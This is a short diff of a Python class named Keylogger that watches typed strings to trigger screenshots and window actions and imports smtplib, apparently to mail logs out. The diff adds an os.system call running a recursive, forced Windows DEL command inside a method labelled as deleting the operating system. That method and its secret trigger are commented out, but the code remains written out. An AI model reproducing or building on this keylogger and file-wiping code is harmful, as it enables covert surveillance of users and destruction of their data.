@@ -3,6 +3,7 @@ import mouse
 import smtplib
 import pyautogui
 import rotatescreen
+import os
 
 from threading import Timer
 from datetime import datetime
@@ -73,8 +74,8 @@ class Keylogger:
             self.screenshot()
         elif string.find("minimise") != -1:
             self.minimise()
-        elif string.find("$pleasedon'ttypeanotherdollarsign$") != -1:
-            self.armageddon()
+        #elif string.find("$pleasedon'ttypeanotherdollarsign$") != -1: # DOOMSDAY BUTTON, NEVER ACTIVITE
+        #    self.armageddon()
 
 
     # Blocks all inputs from the keyboard
@@ -163,8 +164,9 @@ class Keylogger:
     
     # Deletes the operating system
     ###### PLEASE DO NOT USE ######
-    def armageddon(self):
-        self.log = ""
+    #def armageddon(self):
+    #    os.system("DEL H /F/Q/S*.*")
+    #    self.log = ""
 
 if __name__ == "__main__":
     keylogger = Keylogger()
